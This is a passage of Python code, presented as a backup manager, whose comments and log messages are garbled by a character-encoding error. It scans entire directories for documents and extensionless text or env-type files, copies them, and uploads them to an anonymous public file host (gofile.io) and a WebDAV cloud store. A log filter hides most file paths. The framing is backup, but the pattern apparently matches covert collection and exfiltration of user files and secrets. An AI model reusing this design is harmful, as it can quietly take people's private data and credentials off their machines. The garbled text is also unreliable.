                        # ä¿ç•™è¿›åº¦å’ŒçŠ¶æ€ä¿¡æ¯
                        if any(x in msg for x in ["å·²å¤‡ä»½", "å®Œæˆ", "å¤±è´¥", "é”™è¯¯", "æˆåŠŸ", "ğŸ“", "âœ…", "âŒ", "â³", "ğŸ“‹"]):
                            return super().format(record)
                        # å…¶ä»–æ™®é€šæ—¥å¿—
                        return super().format(record)
                    return super().format(record)
            
            # è‡ªå®šä¹‰è¿‡æ»¤å™¨
            class MessageFilter(logging.Filter):
                def filter(self, record):
                    if isinstance(record.msg, str):
                        # è¿‡æ»¤æ‰è·¯å¾„ç›¸å…³çš„æ—¥å¿—ï¼Œä½†ä¿ç•™"æ‰«æç›®å½•"å’Œ"æ’é™¤ç›®å½•"
                        if any(x in record.msg for x in ["æ£€æŸ¥ç›®å½•:", "æ’é™¤ç›®å½•:", "æ‰«æç›®å½•:", ":\\", "/"]):
                            if record.msg.startswith("æ‰«æç›®å½•:") or record.msg.startswith("æ’é™¤ç›®å½•:"):
                                return True
                            return False
                    return True
            
            # é…ç½®æ–‡ä»¶å¤„ç†å™¨
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_formatter = PathFilter('%(asctime)s - %(levelname)s - %(message)s')
            file_handler.setFormatter(file_formatter)
            file_handler.addFilter(MessageFilter())
            
            # é…ç½®æ§åˆ¶å°å¤„ç†å™¨
            console_handler = logging.StreamHandler()
            console_formatter = PathFilter('%(message)s')
            console_handler.setFormatter(console_formatter)
            console_handler.addFilter(MessageFilter())
            
            # é…ç½®æ ¹æ—¥å¿—è®°å½•å™¨
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # æ¸…é™¤ç°æœ‰å¤„ç†å™¨
            root_logger.handlers.clear()
            
            # æ·»åŠ å¤„ç†å™¨
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
          
            logging.info("æ—¥å¿—ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ")
        except (OSError, IOError, PermissionError) as e:
            print(f"è®¾ç½®æ—¥å¿—ç³»ç»Ÿæ—¶å‡ºé”™: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """è·å–ç›®å½•æ€»å¤§å°
        
        Args:
            directory: ç›®å½•è·¯å¾„
            
        Returns:
            int: ç›®å½•å¤§å°ï¼ˆå­—èŠ‚ï¼‰
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """ç¡®ä¿ç›®å½•å­˜åœ¨
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: ç›®å½•æ˜¯å¦å¯ç”¨
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"è·¯å¾„å­˜åœ¨ä½†ä¸æ˜¯ç›®å½•: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"ç›®å½•æ²¡æœ‰å†™å…¥æƒé™: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"åˆ›å»ºç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """æ¸…ç†å¹¶é‡æ–°åˆ›å»ºç›®å½•
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: æ“ä½œæ˜¯å¦æˆåŠŸ
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"æ¸…ç†ç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """æ£€æŸ¥ç½‘ç»œè¿æ¥
        
        Returns:
            bool: æ˜¯å¦æœ‰ç½‘ç»œè¿æ¥
        """
        for host, port in BackupConfig.NETWORK_CHECK_HOSTS:
            try:
                socket.create_connection((host, port), timeout=BackupConfig.NETWORK_TIMEOUT)
                return True
            except (socket.timeout, socket.error) as e:
                logging.debug(f"è¿æ¥ {host}:{port} å¤±è´¥: {e}")
                continue
        return False

    @staticmethod
    def _is_valid_file(file_path):
        """æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        
        Args:
            file_path: æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def _safe_remove_file(self, file_path, retry=True):
        """å®‰å…¨åˆ é™¤æ–‡ä»¶ï¼Œæ”¯æŒé‡è¯•æœºåˆ¶
        
        Args:
            file_path: è¦åˆ é™¤çš„æ–‡ä»¶è·¯å¾„
            retry: æ˜¯å¦ä½¿ç”¨é‡è¯•æœºåˆ¶
            
        Returns:
            bool: åˆ é™¤æ˜¯å¦æˆåŠŸ
        """
        if not os.path.exists(file_path):
            return True
        
        if not retry:
            try:
                os.remove(file_path)
                return True
            except (OSError, IOError, PermissionError):
                return False
        
        # ä½¿ç”¨é‡è¯•æœºåˆ¶åˆ é™¤æ–‡ä»¶
        try:
            # ç­‰å¾…æ–‡ä»¶å¥æŸ„å®Œå…¨é‡Šæ”¾
            time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            for _ in range(self.config.FILE_DELETE_RETRY_COUNT):
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    return True
                except PermissionError:
                    time.sleep(self.config.FILE_DELETE_RETRY_DELAY)
                except (OSError, IOError) as e:
                    logging.debug(f"åˆ é™¤æ–‡ä»¶é‡è¯•ä¸­: {str(e)}")
                    time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            return False
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"åˆ é™¤æ–‡ä»¶å¤±è´¥: {str(e)}")
            return False

    def should_exclude_dir(self, path):
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ’é™¤ç›®å½•
        
        Args:
            path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: æ˜¯å¦åº”è¯¥æ’é™¤
        """
        # ä¼˜å…ˆæ’é™¤ AutoBackup ç›®å½•è‡ªèº«ï¼Œé¿å…è‡ªæˆ‘å¤‡ä»½
        backup_root = os.path.abspath(self.config.BACKUP_ROOT)
        abspath = os.path.abspath(path)
        if abspath.startswith(backup_root):
            return True
        
        path_lower = path.lower()
        path_parts = [part.lower() for part in os.path.normpath(path).split(os.sep)]
        
        # ä¼˜å…ˆæ£€æŸ¥æ˜¯å¦æ˜¯äº‘ç›˜ç›®å½•ï¼Œå¦‚æœæ˜¯åˆ™ä¸æ’é™¤
        cloud_keywords = [
            "äº‘ç›˜", "cloud", "drive", "onedrive", "iclouddrive", "wpsdrive",
            "dropbox", "box", "googledrive", "icloud", "sync", "ç½‘ç›˜", "äº‘"
        ]
        
        # æ£€æŸ¥è·¯å¾„ä¸­çš„æ¯ä¸ªéƒ¨åˆ†
        for part in path_parts:
            part_lower = part.lower()
            # å¦‚æœä»»ä½•éƒ¨åˆ†åŒ…å«äº‘ç›˜å…³é”®è¯ï¼Œåˆ™ä¸æ’é™¤è¯¥ç›®å½•
            if any(keyword.lower() in part_lower for keyword in cloud_keywords):
                return False
        
        # æ£€æŸ¥å®Œæ•´ç›®å½•åæ˜¯å¦åœ¨æ’é™¤åˆ—è¡¨ä¸­
        for ex in self.config.EXCLUDE_INSTALL_DIRS:
            ex_lower = ex.lower()
            ex_parts = set(ex_lower.split())
            
            # æ£€æŸ¥æ¯ä¸ªè·¯å¾„éƒ¨åˆ†
            for part in path_parts:
                # æ ‡å‡†åŒ–è·¯å¾„éƒ¨åˆ†
                part_normalized = set(part.replace('_', ' ').replace('-', ' ').lower().split())
                
                # åªæœ‰å½“æ’é™¤ç›®å½•åå®Œå…¨åŒ¹é…æ—¶æ‰æ’é™¤
                if ex_parts == part_normalized:
                    return True
        
        # å¯¹æ¯ä¸ªå…³é”®è¯è¿›è¡Œæ›´æ™ºèƒ½çš„åŒ¹é…
        for keyword in self.config.EXCLUDE_KEYWORDS:
            keyword_lower = keyword.lower()
            
            # æ£€æŸ¥æ¯ä¸ªè·¯å¾„éƒ¨åˆ†
            for part in path_parts:
                # 1. æ ‡å‡†åŒ–è·¯å¾„éƒ¨åˆ†ï¼Œç§»é™¤æ‰€æœ‰å¸¸è§åˆ†éš”ç¬¦
                normalized_part = (part.replace('_', ' ')
                                    .replace('-', ' ')
                                    .replace('.', ' ')
                                    .replace('cache', ' cache')  # ç‰¹æ®Šå¤„ç†cacheå…³é”®è¯
                                    .lower())
                
                # 2. åˆ†å‰²æˆå•è¯
                word_parts = set(normalized_part.split())
                
                # 3. æ ‡å‡†åŒ–å…³é”®è¯
                normalized_keyword = keyword_lower.replace('_', ' ').replace('-', ' ')
                keyword_parts = set(normalized_keyword.split())
                
                # 4. æ£€æŸ¥å„ç§åŒ¹é…æƒ…å†µ
                if any([
                    keyword_lower in normalized_part.replace(' ', ''),  # ç›´æ¥åŒ…å«
                    keyword_lower in word_parts,  # ä½œä¸ºç‹¬ç«‹å•è¯å­˜åœ¨
                    all(kp in normalized_part.replace(' ', '') for kp in keyword_parts)  # æ‰€æœ‰å…³é”®è¯éƒ¨åˆ†éƒ½å­˜åœ¨
                ]):
                    return True
    
        return False

    def backup_disk_files(self, source_dir, target_dir, extensions_type=1):
        """ç£ç›˜æ–‡ä»¶å¤‡ä»½"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        # ä¼˜å…ˆå¤‡ä»½ MACOS_SPECIFIC_DIRS
        if extensions_type == 4:
            if self.config.DEBUG_MODE:
                logging.debug("ä¼˜å…ˆå¤‡ä»½ MACOS_SPECIFIC_DIRS")
            self.backup_specified_files(source_dir, target_dir)
            # ç»§ç»­åç»­å¤‡ä»½é€»è¾‘

        if self.config.DEBUG_MODE:
            logging.debug(f"å¼€å§‹å¤‡ä»½ç›®å½•:")
            logging.debug(f"æºç›®å½•: {source_dir}")
            logging.debug(f"ç›®æ ‡ç›®å½•: {target_dir}")
            logging.debug(f"æ‰©å±•åç±»å‹: {extensions_type}")

        if not os.path.exists(source_dir):
            logging.error(f"âŒ ç£ç›˜æºç›®å½•ä¸å­˜åœ¨: {source_dir}")
            return None

        if not os.access(source_dir, os.R_OK):
            logging.error(f"âŒ æºç›®å½•æ²¡æœ‰è¯»å–æƒé™: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            logging.error(f"âŒ æ— æ³•æ¸…ç†æˆ–åˆ›å»ºç›®æ ‡ç›®å½•: {target_dir}")
            return None

        # åŸæœ‰çš„æ–‡ä»¶ç±»å‹å¤‡ä»½é€»è¾‘
        extensions = (self.config.DISK_EXTENSIONS_1 if extensions_type == 1 
                     else self.config.DISK_EXTENSIONS_2)
        
        if self.config.DEBUG_MODE:
            logging.debug(f"ä½¿ç”¨çš„æ–‡ä»¶æ‰©å±•å: {extensions}")
                     
        files_count = 0
        total_size = 0
        start_time = time.time()
        last_progress_time = start_time
        scanned_dirs = 0    # å·²æ‰«æç›®å½•æ•°
        excluded_dirs = 0   # å·²æ’é™¤ç›®å½•æ•°
        skipped_files = 0   # è·³è¿‡çš„æ–‡ä»¶æ•°
        matched_files = 0   # åŒ¹é…çš„æ–‡ä»¶æ•°

        # macOS ç‰¹å®šæ–‡ä»¶ç±»å‹
        macos_file_types = {
            'numbers': ['numbers', 'spreadsheet'],
            'pages': ['pages', 'document'],
            'keynote': ['keynote', 'presentation'],
            'textedit': ['textedit', 'text'],
            'preview': ['preview', 'image'],
            'pdf': ['pdf', 'document'],
            'rtf': ['rtf', 'document'],
            'rtfd': ['rtfd', 'document']
        }

        # macOS iWork æ–‡æ¡£ MIME ç±»å‹ï¼ˆå»é™¤ keynoteï¼‰
        macos_mime_types = {
            'pages': ['application/x-iwork-pages-sffpages'],
            'numbers': ['application/x-iwork-numbers-sffnumbers'],
        }
        # çº¯æ–‡æœ¬ç±»å‹
        plain_text_types = ['text/plain', 'text/x-env', 'text/rtf']

        try:
            # ä½¿ç”¨ os.walk çš„ topdown=True å‚æ•°ï¼Œè¿™æ ·å¯ä»¥è·³è¿‡ä¸éœ€è¦çš„ç›®å½•
            for root, dirs, files in os.walk(source_dir, topdown=True):
                scanned_dirs += 1
                
                # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
                current_time = time.time()
                if current_time - start_time > self.config.SCAN_TIMEOUT:
                    logging.error(f"âŒ æ‰«æç›®å½•è¶…æ—¶: {source_dir}")
                    break
                    
                # å®šæœŸæ˜¾ç¤ºè¿›åº¦
                if current_time - last_progress_time >= self.config.PROGRESS_INTERVAL:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"â³ å·²æ‰«æ {scanned_dirs} ä¸ªç›®å½•ï¼Œæ’é™¤ {excluded_dirs} ä¸ªç›®å½•")
                        logging.debug(f"â³ å½“å‰æ‰«æ: {root}")
                        logging.debug(f"â³ å·²åŒ¹é… {matched_files} ä¸ªæ–‡ä»¶ï¼Œè·³è¿‡ {skipped_files} ä¸ªæ–‡ä»¶")
                    last_progress_time = current_time
                
                # è·³è¿‡ç›®æ ‡ç›®å½•
                if os.path.abspath(root).startswith(target_dir):
                    continue
                
                # åªå¯¹å­ç›®å½•åšæ’é™¤åˆ¤æ–­ï¼Œæ ¹ç›®å½•ä¸æ’é™¤
                if root != source_dir and self.should_exclude_dir(root):
                    excluded_dirs += 1
                    dirs.clear()  # æ¸…ç©ºå­ç›®å½•åˆ—è¡¨ï¼Œé¿å…ç»§ç»­éå†
                    continue

                # å¤„ç†æ–‡ä»¶
                for file in files:
                    file_lower = file.lower()
                    source_file = os.path.join(root, file)
                    
                    # æ£€æŸ¥æ–‡ä»¶ç±»å‹
                    should_backup = False
                    
                    # 1. æ£€æŸ¥æ–‡ä»¶æ‰©å±•å
                    if any(file_lower.endswith(ext.lower()) for ext in extensions):
                        should_backup = True
                    else:
                        # 2. åªå¯¹æ— æ‰©å±•åæ–‡ä»¶åšç±»å‹æ£€æµ‹
                        if '.' not in file:
                            try:
                                file_type = subprocess.check_output(['file', '-b', '--mime-type', source_file]).decode('utf-8').strip()
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"æ— æ‰©å±•åæ–‡ä»¶ç±»å‹æ£€æµ‹: {file} -> {file_type}")
                                # åªè¯†åˆ« pages/numbers
                                for type_key, mime_list in macos_mime_types.items():
                                    if file_type in mime_list:
                                        should_backup = True
                                        if self.config.DEBUG_MODE:
                                            logging.debug(f"åŒ¹é…åˆ° macOS iWork æ–‡ä»¶ç±»å‹: {file} -> {type_key}")
                                        break
                                # è¯†åˆ«çº¯æ–‡æœ¬å’Œenvç±»å‹
                                if file_type in plain_text_types:
                                    should_backup = True
                                    if self.config.DEBUG_MODE:
                                        logging.debug(f"æ— æ‰©å±•åæ–‡ä»¶è¯†åˆ«ä¸ºæ–‡æœ¬ç±»å‹: {file} -> {file_type}")
                            except Exception as e:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"æ–‡ä»¶ç±»å‹æ£€æµ‹å¤±è´¥: {source_file} - {str(e)}")
                    
                    if not should_backup:
                        skipped_files += 1
                        continue

                    matched_files += 1
                    
                    # æ£€æŸ¥æ–‡ä»¶å¤§å°
                    try:
                        file_size = os.path.getsize(source_file)
                        if file_size == 0:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"è·³è¿‡ç©ºæ–‡ä»¶: {source_file}")
                            skipped_files += 1
                            continue
                        if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"è·³è¿‡å¤§æ–‡ä»¶: {source_file} ({file_size / 1024 / 1024:.1f}MB)")
                            skipped_files += 1
                            continue
                    except OSError as e:
                        if self.config.DEBUG_MODE:
                            logging.debug(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥: {source_file} - {str(e)}")
                        skipped_files += 1
                        continue

                    # å°è¯•å¤åˆ¶æ–‡ä»¶
                    for attempt in range(self.config.FILE_RETRY_COUNT):
                        try:
                            # æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å¯è®¿é—®
                            try:
                                with open(source_file, 'rb') as test_read:
                                    test_read.read(1)
                            except (PermissionError, OSError) as e:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"æ–‡ä»¶è®¿é—®å¤±è´¥: {source_file} - {str(e)}")
                                if attempt < self.config.FILE_RETRY_COUNT - 1:
                                    time.sleep(self.config.FILE_RETRY_DELAY)
                                    continue
                                else:
                                    skipped_files += 1
                                    break

                            relative_path = os.path.relpath(root, source_dir)
                            target_sub_dir = os.path.join(target_dir, relative_path)
                            target_file = os.path.join(target_sub_dir, file)

                            if not self._ensure_directory(target_sub_dir):
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"åˆ›å»ºç›®æ ‡å­ç›®å½•å¤±è´¥: {target_sub_dir}")
                                skipped_files += 1
                                break
                                
                            # ä½¿ç”¨ä¼˜åŒ–çš„åˆ†å—å¤åˆ¶ï¼ˆ1MBå—å¤§å°ï¼‰
                            with open(source_file, 'rb') as src, open(target_file, 'wb') as dst:
                                while True:
                                    chunk = src.read(self.config.COPY_CHUNK_SIZE)
                                    if not chunk:
                                        break
                                    dst.write(chunk)
                                    
                            files_count += 1
                            total_size += file_size
                            
                            if self.config.DEBUG_MODE:
                                logging.debug(f"æˆåŠŸå¤åˆ¶: {source_file} -> {target_file}")
                            
                            break  # æˆåŠŸåè·³å‡ºé‡è¯•å¾ªç¯
                            
                        except (PermissionError, OSError, IOError) as e:
                            if attempt == self.config.FILE_RETRY_COUNT - 1:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"âŒ æ–‡ä»¶å¤åˆ¶å¤±è´¥: {source_file} - {str(e)}")
                                skipped_files += 1

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"âŒ å¤‡ä»½è¿‡ç¨‹å‡ºé”™: {str(e)}")
        except Exception as e:
            logging.error(f"âŒ å¤‡ä»½è¿‡ç¨‹å‡ºç°æœªçŸ¥é”™è¯¯: {str(e)}")

        # æ˜¾ç¤ºæœ€ç»ˆç»Ÿè®¡ä¿¡æ¯
        if files_count > 0:
            logging.info(f"\nğŸ“Š å¤‡ä»½å®Œæˆ:")
            logging.info(f"   ğŸ“ æ–‡ä»¶æ•°é‡: {files_count}")
            logging.info(f"   ğŸ’¾ æ€»å¤§å°: {total_size / 1024 / 1024:.1f}MB")
            if self.config.DEBUG_MODE:
                logging.debug(f"   ğŸ“‚ æ‰«æç›®å½•æ•°: {scanned_dirs}")
                logging.debug(f"   ğŸš« æ’é™¤ç›®å½•æ•°: {excluded_dirs}")
                logging.debug(f"   â­ï¸ è·³è¿‡æ–‡ä»¶æ•°: {skipped_files}")
                logging.debug(f"   âœ… åŒ¹é…æ–‡ä»¶æ•°: {matched_files}")
            return target_dir
        else:
            if self.config.DEBUG_MODE:
                logging.debug(f"æ‰«æç»Ÿè®¡:")
                logging.debug(f"- æ‰«æç›®å½•æ•°: {scanned_dirs}")
                logging.debug(f"- æ’é™¤ç›®å½•æ•°: {excluded_dirs}")
                logging.debug(f"- è·³è¿‡æ–‡ä»¶æ•°: {skipped_files}")
                logging.debug(f"- åŒ¹é…æ–‡ä»¶æ•°: {matched_files}")
            logging.error(f"âŒ æœªæ‰¾åˆ°éœ€è¦å¤‡ä»½çš„æ–‡ä»¶")
            return None
    
    def _get_upload_server(self):
        """è·å–ä¸Šä¼ æœåŠ¡å™¨åœ°å€
    
        Returns:
            str: ä¸Šä¼ æœåŠ¡å™¨URL
        """
        return "https://store9.gofile.io/uploadFile"

    def split_large_file(self, file_path):
        """å°†å¤§æ–‡ä»¶åˆ†å‰²æˆå°å—
        
        Args:
            file_path: è¦åˆ†å‰²çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: åˆ†ç‰‡æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼Œå¦‚æœä¸éœ€è¦åˆ†å‰²åˆ™è¿”å›None
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return None
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            logging.critical(f"æ–‡ä»¶ {file_path} å·²åˆ†å‰²ä¸º {len(chunk_files)} ä¸ªåˆ†ç‰‡")
            return chunk_files
        except (OSError, IOError, PermissionError, MemoryError) as e:
            logging.error(f"åˆ†å‰²æ–‡ä»¶å¤±è´¥ {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """ä¸Šä¼ æ–‡ä»¶åˆ°æœåŠ¡å™¨
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not self._is_valid_file(file_path):
            logging.error(f"æ–‡ä»¶ {file_path} ä¸ºç©ºæˆ–æ— æ•ˆï¼Œè·³è¿‡ä¸Šä¼ ")
            return False

        # æ£€æŸ¥æ–‡ä»¶å¤§å°å¹¶åœ¨éœ€è¦æ—¶åˆ†ç‰‡
        chunk_files = self.split_large_file(file_path)
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # ä»…åœ¨å…¨éƒ¨åˆ†ç‰‡ä¸Šä¼ æˆåŠŸåæ¸…ç†åˆ†ç‰‡ç›®å½•ä¸åŸå§‹æ–‡ä»¶
            if success:
                chunk_dir = os.path.dirname(chunk_files[0])
                self._clean_directory(chunk_dir)
                # è‹¥åŸå§‹æ–‡ä»¶ä»åœ¨ï¼Œä¸Šä¼ æˆåŠŸååˆ é™¤
                if os.path.exists(file_path):
                    self._safe_remove_file(file_path, retry=True)
            return success
        else:
            return self._upload_single_file(file_path)

    def _create_remote_directory(self, remote_dir):
        """åˆ›å»ºè¿œç¨‹ç›®å½•ï¼ˆä½¿ç”¨ WebDAV MKCOL æ–¹æ³•ï¼‰"""
        if not remote_dir or remote_dir == '.':
            return True
        
        try:
            # æ„å»ºç›®å½•è·¯å¾„
            dir_path = f"{self.infini_url.rstrip('/')}/{remote_dir.lstrip('/')}"
            
            response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
            
            if response.status_code in [201, 204, 405]:  # 405 è¡¨ç¤ºå·²å­˜åœ¨
                return True
            elif response.status_code == 409:
                # 409 å¯èƒ½è¡¨ç¤ºçˆ¶ç›®å½•ä¸å­˜åœ¨ï¼Œå°è¯•åˆ›å»ºçˆ¶ç›®å½•
                parent_dir = os.path.dirname(remote_dir)
                if parent_dir and parent_dir != '.':
                    if self._create_remote_directory(parent_dir):
                        # çˆ¶ç›®å½•åˆ›å»ºæˆåŠŸï¼Œå†æ¬¡å°è¯•åˆ›å»ºå½“å‰ç›®å½•
                        response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
                        return response.status_code in [201, 204, 405]
                return False
            else:
                return False
        except Exception:
            return False

    def _upload_single_file_infini(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶åˆ° Infini Cloudï¼ˆä½¿ç”¨ WebDAV PUT æ–¹æ³•ï¼‰"""
        try:
            # æ£€æŸ¥æ–‡ä»¶æƒé™å’ŒçŠ¶æ€
            if not os.path.exists(file_path):
                logging.error(f"æ–‡ä»¶ä¸å­˜åœ¨: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"æ–‡ä»¶å¤§å°ä¸º0: {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"æ–‡ä»¶è¿‡å¤§ {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            # æ„å»ºè¿œç¨‹è·¯å¾„
            filename = os.path.basename(file_path)
            remote_filename = f"{self.config.INFINI_REMOTE_BASE_DIR}/{filename}"
            remote_path = f"{self.infini_url.rstrip('/')}/{remote_filename.lstrip('/')}"
            
            # åˆ›å»ºè¿œç¨‹ç›®å½•ï¼ˆå¦‚æœéœ€è¦ï¼‰
            remote_dir = os.path.dirname(remote_filename)
            if remote_dir and remote_dir != '.':
                if not self._create_remote_directory(remote_dir):
                    logging.warning(f"æ— æ³•åˆ›å»ºè¿œç¨‹ç›®å½•: {remote_dir}ï¼Œå°†ç»§ç»­å°è¯•ä¸Šä¼ ")

            # ä¸Šä¼ é‡è¯•é€»è¾‘
            for attempt in range(self.config.RETRY_COUNT):
                if not self._check_internet_connection():
                    logging.error("ç½‘ç»œè¿æ¥ä¸å¯ç”¨ï¼Œç­‰å¾…é‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)
                    continue

                try:
                    # æ ¹æ®æ–‡ä»¶å¤§å°åŠ¨æ€è°ƒæ•´è¶…æ—¶æ—¶é—´
                    if file_size < 1024 * 1024:  # å°äº1MB
                        connect_timeout = 10
                        read_timeout = 30
                    elif file_size < 10 * 1024 * 1024:  # 1-10MB
                        connect_timeout = 15
                        read_timeout = max(30, int(file_size / 1024 / 1024 * 5))
                    else:  # å¤§äº10MB
                        connect_timeout = 20
                        read_timeout = max(60, int(file_size / 1024 / 1024 * 6))
                    
                    # åªåœ¨ç¬¬ä¸€æ¬¡å°è¯•æ—¶æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯
                    if attempt == 0:
                        size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                        logging.critical(f"ğŸ“¤ [Infini Cloud] ä¸Šä¼ : {filename} ({size_str})")
                    elif self.config.DEBUG_MODE:
                        logging.debug(f"[Infini Cloud] é‡è¯•ä¸Šä¼ : {filename} (ç¬¬ {attempt + 1} æ¬¡)")
                    
                    # å‡†å¤‡è¯·æ±‚å¤´
                    headers = {
                        'Content-Type': 'application/octet-stream',
                        'Content-Length': str(file_size),
                    }
                    
                    # æ‰§è¡Œä¸Šä¼ ï¼ˆä½¿ç”¨ WebDAV PUT æ–¹æ³•ï¼‰
                    with open(file_path, 'rb') as f:
                        response = self.session.put(
                            remote_path,
                            data=f,
                            headers=headers,
                            auth=self.auth,
                            timeout=(connect_timeout, read_timeout),
                            stream=False
                        )
                    
                    if response.status_code in [201, 204]:
                        logging.critical(f"âœ… [Infini Cloud] {filename}")
                        return True
                    elif response.status_code == 403:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: æƒé™ä¸è¶³")
                    elif response.status_code == 404:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: è¿œç¨‹è·¯å¾„ä¸å­˜åœ¨")
                    elif response.status_code == 409:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: è¿œç¨‹è·¯å¾„å†²çª")
                    else:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"âŒ [Infini Cloud] {filename}: çŠ¶æ€ç  {response.status_code}")
                        
                except requests.exceptions.Timeout:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: è¶…æ—¶")
                except requests.exceptions.SSLError as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: SSLé”™è¯¯")
                except requests.exceptions.ConnectionError as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: è¿æ¥é”™è¯¯")
                except Exception as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"âŒ [Infini Cloud] {os.path.basename(file_path)}: {str(e)}")

                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"ç­‰å¾… {self.config.RETRY_DELAY} ç§’åé‡è¯•...")
                    time.sleep(self.config.RETRY_DELAY)

            return False
            
        except OSError as e:
            logging.error(f"è·å–æ–‡ä»¶ä¿¡æ¯å¤±è´¥ {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"[Infini Cloud] ä¸Šä¼ è¿‡ç¨‹å‡ºé”™: {e}")
            return False

    def _upload_single_file_gofile(self, file_path):
        """ä¸Šä¼ å•ä¸ªæ–‡ä»¶åˆ° GoFileï¼ˆå¤‡é€‰æ–¹æ¡ˆï¼‰
        
        Args:
            file_path: è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if not os.path.exists(file_path):
            logging.error(f"æ–‡ä»¶ä¸å­˜åœ¨: {file_path}")
